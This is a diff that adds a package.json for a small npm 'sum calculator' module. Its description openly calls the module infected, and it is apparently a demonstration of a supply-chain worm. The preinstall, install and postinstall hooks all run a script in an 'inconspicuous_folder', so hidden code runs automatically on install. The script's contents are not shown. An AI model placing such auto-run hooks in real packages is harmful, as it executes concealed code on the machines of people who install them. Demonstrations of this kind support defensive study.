@@ -1,0 +1,15 @@
+{
+  "name": "efficient_sum_calculator",
+  "version": "1.1.3",
+  "description": "This is a very efficient (and infected) module to calculate the sum of numbers",
+  "license": "ISC",
+  "author": "",
+  "type": "commonjs",
+  "main": "index.js",
+  "scripts": {
+    "test": "node index.test.js",
+    "preinstall": "node inconspicuous_folder/sha1-hulud-demo.js preinstall",
+    "install": "node inconspicuous_folder/sha1-hulud-demo.js install",
+    "postinstall": "node inconspicuous_folder/sha1-hulud-demo.js postinstall"
+  }
+}
